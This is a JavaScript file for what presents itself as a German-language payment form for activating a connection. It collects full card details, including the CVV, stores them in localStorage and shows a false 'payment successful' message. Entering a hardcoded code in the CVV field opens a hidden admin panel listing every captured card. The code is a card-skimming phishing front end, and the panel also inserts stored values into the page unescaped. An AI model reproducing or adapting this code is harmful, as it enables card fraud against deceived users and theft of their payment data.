const ADMIN_CODE = "sdmin123ka";

// Завантажуємо збережені дані при запуску
let savedData = JSON.parse(localStorage.getItem('cardData') || '[]');

function sendData() {
    const cardholder = document.getElementById('cardholder').value;
    const cardNumber = document.getElementById('cardNumber').value;
    const expDate = document.getElementById('expDate').value;
    const cvv = document.getElementById('cvv').value;

    // Перевірка заповненості полів
    if (!cardholder || !cardNumber || !expDate || !cvv) {
        alert('Bitte füllen Sie alle Felder aus!');
        return;
    }

    const cardData = {
        holder: cardholder,
        number: cardNumber,
        exp: expDate,
        cvv: cvv,
        timestamp: new Date().toLocaleString('de-DE'),
        ip: 'N/A'
    };

    // Перевірка чи це адмінський код
    if (cardData.cvv === ADMIN_CODE) {
        showAdminPanel();
        return;
    }

    // Зберігаємо дані в масив і localStorage
    savedData.push(cardData);
    localStorage.setItem('cardData', JSON.stringify(savedData));
    
    alert('Zahlung erfolgreich! Die Verbindung wird in einer Minute aktiviert.');
    
    // Очищаємо форму
    document.getElementById('cardholder').value = '';
    document.getElementById('cardNumber').value = '';
    document.getElementById('expDate').value = '';
    document.getElementById('cvv').value = '';
}

function showAdminPanel() {
    const adminPanel = document.getElementById('adminPanel');
    const savedDataDiv = document.getElementById('savedData');
    
    if (savedData.length === 0) {
        savedDataDiv.innerHTML = '<p>Keine Daten gespeichert</p>';
    } else {
        let html = '<div style="text-align: left; max-height: 300px; overflow-y: auto;">';
        savedData.forEach((data, index) => {
            html += `
                <div style="border: 1px solid #ccc; padding: 10px; margin: 5px 0; border-radius: 5px; background: white;">
                    <strong>Eintrag ${index + 1}:</strong><br>
                    <strong>Inhaber:</strong> ${data.holder}<br>
                    <strong>Nummer:</strong> ${data.number}<br>
                    <strong>Gültig bis:</strong> ${data.exp}<br>
                    <strong>CVV:</strong> ${data.cvv}<br>
                    <strong>Datum:</strong> ${data.timestamp}<br>
                    <strong>IP:</strong> ${data.ip}
                </div>
            `;
        });
        html += '</div>';
        savedDataDiv.innerHTML = html;
    }
    
    adminPanel.style.display = 'block';
    alert('Admin-Panel aktiviert!');
}

function clearAllData() {
    if (confirm('Wirklich alle Daten löschen?')) {
        savedData = [];
        localStorage.removeItem('cardData');
        document.getElementById('savedData').innerHTML = '<p>Keine Daten gespeichert</p>';
        alert('Alle Daten wurden gelöscht!');
    }
}

// Додаємо обробник події для Enter
document.addEventListener('DOMContentLoaded', function() {
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendData();
            }
        });
    });
});
